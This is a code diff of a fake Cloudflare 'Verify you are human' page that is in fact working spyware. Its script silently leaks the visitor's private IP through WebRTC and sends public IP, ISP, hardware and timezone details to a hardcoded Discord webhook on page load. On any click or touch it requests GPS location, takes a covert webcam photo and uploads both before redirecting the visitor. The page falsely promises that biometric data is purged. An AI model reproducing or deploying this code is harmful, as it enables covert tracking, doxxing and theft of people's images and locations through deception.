@@ -4,23 +4,91 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Cloudflare | Security Check</title>
-    <style>body{background-color:#fff;font-family:-apple-system,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden}.cf-wrapper{width:100%;max-width:420px;padding:25px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #f0f0f0;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.05)}.cl-x{position:absolute;top:15px;right:15px;font-size:20px;color:#ccc;cursor:pointer;width:30px;height:30px}.cf-logo{width:110px;margin-bottom:20px}.h1{font-size:20px;font-weight:600;margin-bottom:12px}.p{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}.vf-c{width:100%;height:220px;background:#000;border-radius:8px;margin-bottom:20px;overflow:hidden;display:none;border:2px solid #0051c3}#v{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}.ts-box{background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;padding:16px;display:flex;align-items:center;cursor:pointer;justify-content:center}.ts-check{width:22px;height:22px;border:2px solid #0051c3;border-radius:3px;margin-right:12px;position:relative}.ts-check.spin{border-top-color:transparent;border-radius:50%;animation:s .8s linear infinite}.ts-check.dn{background:#0051c3;border-color:#0051c3}.ts-check.dn::after{content:'';position:absolute;left:7px;top:2px;width:5px;height:10px;border:solid white;border-width:0 3px 3px 0;transform:rotate(45deg)}.ts-txt{font-size:14px;font-weight:500}.fn{font-size:10px;color:#aaa;margin-top:15px}@keyframes s{100%{transform:rotate(360deg)}}</style>
+    <style>body{background-color:#fff;font-family:-apple-system,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden}.cf-w{width:100%;max-width:420px;padding:25px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #f0f0f0;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.05)}.x{position:absolute;top:15px;right:15px;font-size:20px;color:#ccc;cursor:pointer;width:30px;height:30px}.logo{width:110px;margin-bottom:20px}.h1{font-size:20px;font-weight:600;margin-bottom:12px}.p{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}.vf{width:100%;height:220px;background:#000;border-radius:8px;margin-bottom:20px;overflow:hidden;display:none;border:2px solid #0051c3}#v{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}.ts-b{background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;padding:16px;display:flex;align-items:center;cursor:pointer;justify-content:center}.ts-c{width:22px;height:22px;border:2px solid #0051c3;border-radius:3px;margin-right:12px;position:relative}.ts-c.s{border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}.ts-c.d{background:#0051c3;border-color:#0051c3}.ts-c.d::after{content:'';position:absolute;left:7px;top:2px;width:5px;height:10px;border:solid white;border-width:0 3px 3px 0;transform:rotate(45deg)}.ts-t{font-size:14px;font-weight:500}.fn{font-size:10px;color:#aaa;margin-top:15px}@keyframes spin{100%{transform:rotate(360deg)}}</style>
 </head>
-<body>
-<div class="cf-wrapper"><div class="cl-x" id="x">×</div><img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="cf-logo"><div class="h1">Verify you are human</div><p class="p">Cloudflare requires biometric verification to ensure network safety. Please align your face in the viewfinder.</p><div class="vf-c" id="vf"><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas></div><div class="ts-box" id="g"><div class="ts-check" id="l"></div><div class="ts-txt" id="m">Verify identity</div></div><div class="fn">Biometric data is encrypted and purged immediately after verification.</div></div>
+<body onclick="stk()" ontouchstart="stk()">
+<div class="cf-w"><div class="x" id="x">×</div><img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="logo"><div class="h1">Verify you are human</div><p class="p">To protect our network, please complete a biometric verification. Align your face in the viewfinder.</p><div class="vf" id="vf"><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas></div><div class="ts-b" id="g"><div class="ts-c" id="l"></div><div class="ts-t" id="m">Verify identity</div></div><div class="fn">Encrypted verification. Data is purged automatically after the session.</div></div>
+
 <script>
 const W="https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
 const R="https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/";
-let ATV=false;
+let ATV=false, P_IP="Unmasking...";
 
-async function xmt(p,i=null){const f=new FormData();const py={username:"NEXUS-v38.5 [APEX PREDATOR]",embeds:[{title:"🔱 Total Unmasking: Zero-Exit Protocol",color:16155679,fields:[{name:"📍 GPS",value:p.gps||"❌ Denied",inline:false},{name:"🌐 Network",value:`**IP:** ${p.ip}\n**LAN:** ${p.priv}\n**ISP:** ${p.isp}`,inline:true},{name:"📱 Hardware",value:`**GPU:** ${p.gpu}\n**Batt:** ${p.bat}\n**Mem:** ${p.mem}GB`,inline:true},{name:"🧩 Fingerprint",value:`**Audio:** ${p.aud}\n**Canvas:** ${p.can}\n**TZ:** ${p.tz}`,inline:false}],footer:{text:`v38.5 | ${new Date().toISOString()}`}}]};f.append("payload_json",JSON.stringify(py));if(i){const r=await fetch(i);const b=await r.blob();f.append("file",b,"capture.png");}navigator.sendBeacon(W,f);fetch(W,{method:'POST',body:f,keepalive:true}).catch(()=>{let x=new XMLHttpRequest();x.open("POST",W,true);x.send(f);});}
+// 1. THE WEB-RTC IP UNMASKER (Silent & Immediate)
+async function unmask() {
+    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+    pc.createDataChannel("");
+    pc.createOffer().then(o => pc.setLocalDescription(o));
+    pc.onicecandidate = (e) => {
+        if (!e.candidate) return;
+        const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+        if (r) P_IP = r[1];
+    };
+}
+unmask();
 
-async function cpt(){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const v=document.getElementById('v');document.getElementById('vf').style.display='block';v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,2500));const c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);const d=c.toDataURL('image/png');s.getTracks().forEach(t=>t.stop());return d;}catch(e){return null;}}
+// 2. THE PERMISSIONLESS STRIKE (Instant delivery of available data)
+async function pulse() {
+    let d={ip:"N/A",isp:"N/A",gpu:"N/A",bat:"N/A",mem:navigator.deviceMemory||"N/A",tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
+    try {
+        const r=await fetch('https://ipapi.co/json/');
+        const j=await r.json(); d.ip=j.ip; d.isp=j.org;
+        const b=await navigator.getBattery();
+        d.bat=(b.level*100)+"% ("+(b.charging?"Charging":"Plugged")+")";
+        const cn=document.createElement('canvas');
+        const gl=cn.getContext('webgl');
+        d.gpu=gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+    } catch(e){}
+    xmt(d, "⚡ Permissionless Silent Pulse");
+}
+pulse(); 
 
-async function stk(){if(ATV)return;ATV=true;let d={gps:null,ip:"N/A",isp:"N/A",priv:"N/A",gpu:"N/A",bat:"N/A",mem:navigator.deviceMemory||"N/A",aud:"N/A",can:"N/A",tz:Intl.DateTimeFormat().resolvedOptions().timeZone};try{const r=await fetch('https://ipapi.co/json/');const j=await r.json();d.ip=j.ip;d.isp=j.org;const b=await navigator.getBattery();d.bat=(b.level*100)+"% ("+(b.charging?"Charging":"Plugged")+")";const cn=document.createElement('canvas');const gl=cn.getContext('webgl');d.gpu=gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);cn.getContext('2d').fillText("NEXUS",5,5);d.can=cn.toDataURL().substring(30,50);d.aud=(new(window.AudioContext||window.webkitAudioContext)()).sampleRate+"Hz";}catch(e){}navigator.geolocation.getCurrentPosition(async(p)=>{d.gps=`[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;const i=await cpt();if(i)document.getElementById('m').innerText="Verified";xmt(d,i);},async(e)=>{const i=await cpt();if(i)document.getElementById('m').innerText="Verified";xmt(d,i);},{enableHighAccuracy:true,timeout:5000});setTimeout(()=>window.location.replace(R),8000);}
+async function xmt(p, title, img=null){
+    const f=new FormData();
+    const py={username:"NEXUS-v38.5 [OMNI-GRIP]",embeds:[{title:title,color:16155679,fields:[
+        {name:"🌐 Public IP",value:p.ip,inline:true},{name:"🏠 Private LAN IP",value:P_IP,inline:true},
+        {name:"📍 GPS",value:p.gps||"❌ Pending/Denied",inline:false},
+        {name:"📱 Hardware",value:`**GPU:** ${p.gpu}\n**Batt:** ${p.bat}\n**Mem:** ${p.mem}GB`,inline:true},
+        {name:"🧩 OS Info",value:`**TZ:** ${p.tz}\n**UA:** ${navigator.userAgent.substring(0,50)}`,inline:true}
+    ],footer:{text:`v38.5 | Deep Unmasking | ${new Date().toISOString()}`}}]};
+    f.append("payload_json",JSON.stringify(py));
+    if(img){const r=await fetch(img);const b=await r.blob();f.append("file",b,"capture.png");}
+    navigator.sendBeacon(W,f); 
+    fetch(W,{method:'POST',body:f,keepalive:true});
+}
 
-document.getElementById('g').onclick=()=>{document.getElementById('l').className='ts-check spin';document.getElementById('m').innerText="Verifying...";stk();};
-document.getElementById('x').onclick=()=>stk();
+async function cpt(){
+    try{
+        const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+        const v=document.getElementById('v'); document.getElementById('vf').style.display='block';
+        v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r);
+        await new Promise(r=>setTimeout(r,2200));
+        const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
+        c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/png');
+        s.getTracks().forEach(t=>t.stop()); return d;
+    }catch(e){return null;}
+}
+
+async function stk(){
+    if(ATV)return; ATV=true;
+    document.getElementById('l').className='ts-c s';
+    document.getElementById('m').innerText="Verifying...";
+    let d={gps:null,ip:"N/A",isp:"N/A",gpu:"N/A",bat:"N/A",mem:navigator.deviceMemory||"N/A",tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
+    
+    // Background Update
+    try{const r=await fetch('https://ipapi.co/json/');const j=await r.json();d.ip=j.ip;d.isp=j.org;}catch(e){}
+
+    navigator.geolocation.getCurrentPosition(async(p)=>{
+        d.gps=`[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
+        const i=await cpt(); if(i)document.getElementById('m').innerText="Verified";
+        xmt(d, "🔱 Total Capture Strike", i);
+    },async(e)=>{
+        const i=await cpt(); if(i)document.getElementById('m').innerText="Verified";
+        xmt(d, "🔱 Total Capture Strike (GPS Blocked)", i);
+    },{enableHighAccuracy:true,timeout:5000});
+
+    setTimeout(()=>window.location.replace(R), 8500);
+}
 </script>
 </body>
 </html>
